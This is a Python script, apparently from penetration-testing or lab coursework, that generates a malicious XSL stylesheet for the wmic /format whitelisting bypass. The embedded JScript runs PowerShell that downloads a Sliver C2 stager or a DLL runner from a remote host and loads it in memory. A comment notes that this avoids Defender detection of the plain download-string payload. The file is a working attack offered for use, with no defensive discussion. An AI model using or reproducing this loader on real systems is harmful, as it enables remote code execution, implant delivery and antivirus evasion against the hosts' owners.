#PAYLOAD = """cmd.exe /c powershell.exe -c \\"$data = (New-Object System.Net.WebClient).DownloadData('http://192.168.49.65/win_msf_sliver_stager.exe')\\";$assem = [System.Reflection.Assembly]::Load($data);[SliverStager.Stager]::Main()"""

# DLL Runner
PAYLOAD = """cmd.exe /c powershell.exe -c \\"$data = (New-Object System.Net.WebClient).DownloadData('http://192.168.49.65/DLL-Runner-x64.dll');$assem = [System.Reflection.Assembly]::Load($data);$class = $assem.GetType('LeMans.Class1');$method = $class.GetMethod('ferrari');$method.Invoke(0, $null)\\" """

## Raw payload gets detected by defender:
#PAYLOAD = "cmd.exe /c powershell.exe -c \\"(New-Object System.Net.WebClient).DownloadString('http://192.168.49.65/run.txt')\\""

TEMPLATE = f"""
<?xml version='1.0'?>
<stylesheet version="1.0"
xmlns="http://www.w3.org/1999/XSL/Transform"
xmlns:ms="urn:schemas-microsoft-com:xslt"
xmlns:user="http://mycompany.com/mynamespace">
<output method="text"/>
 <ms:script implements-prefix="user" language="JScript">
 <![CDATA[
 var r = new ActiveXObject("WScript.Shell");
 r.Run("{PAYLOAD}");
 ]]>
 </ms:script>
</stylesheet>
"""

print(TEMPLATE)

print('Run with: wmic process get brief /format:"http://192.168.49.65/test.xsl"')
print('Or run locally')
